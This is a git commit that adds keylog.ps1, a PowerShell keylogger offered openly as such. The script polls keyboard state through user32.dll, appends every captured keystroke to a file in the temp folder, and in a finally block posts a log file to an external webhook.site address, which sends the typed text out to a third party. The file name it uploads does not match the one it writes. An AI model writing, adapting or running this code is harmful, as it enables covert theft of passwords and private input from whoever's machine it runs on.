99ffe6c1204cf99336fd570f44fef62e3cb042dd
Syke <42148690+ISykeI@users.noreply.github.com>
2022-02-10 00:25:27 +0200

    Create keylog.ps1

---
+++ keylog.ps1
@@ -0,0 +1,62 @@
+
+# keylogger
+function KeyLogger($logFile="$env:temp/$env:UserName.log") {
+
+  # generate log file
+  $generateLog = New-Item -Path $logFile -ItemType File -Force
+
+  # API signatures
+  $APIsignatures = @'
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
+public static extern short GetAsyncKeyState(int virtualKeyCode);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int GetKeyboardState(byte[] keystate);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+'@
+
+ # set up API
+ $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
+
+  # attempt to log keystrokes
+  try {
+    while ($true) {
+      Start-Sleep -Milliseconds 40
+
+      for ($ascii = 9; $ascii -le 254; $ascii++) {
+
+        # use API to get key state
+        $keystate = $API::GetAsyncKeyState($ascii)
+
+        # use API to detect keystroke
+        if ($keystate -eq -32767) {
+          $null = [console]::CapsLock
+
+          # map virtual key
+          $mapKey = $API::MapVirtualKey($ascii, 3)
+
+          # create a stringbuilder
+          $keyboardState = New-Object Byte[] 256
+          $hideKeyboardState = $API::GetKeyboardState($keyboardState)
+          $loggedchar = New-Object -TypeName System.Text.StringBuilder
+
+          # translate virtual key
+          if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
+            # add logged key to file
+            [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
+          }
+        }
+      }
+    }
+  }
+
+  # send logs if code fails
+  finally {
+    powershell Invoke-WebRequest -Uri https://webhook.site/e5a880e0-d6d0-4945-88e2-68874b1e1fe0? -Method POST -InFile $env:temp/keylogger.log
+  }
+}
+
+# run keylogger
+KeyLogger
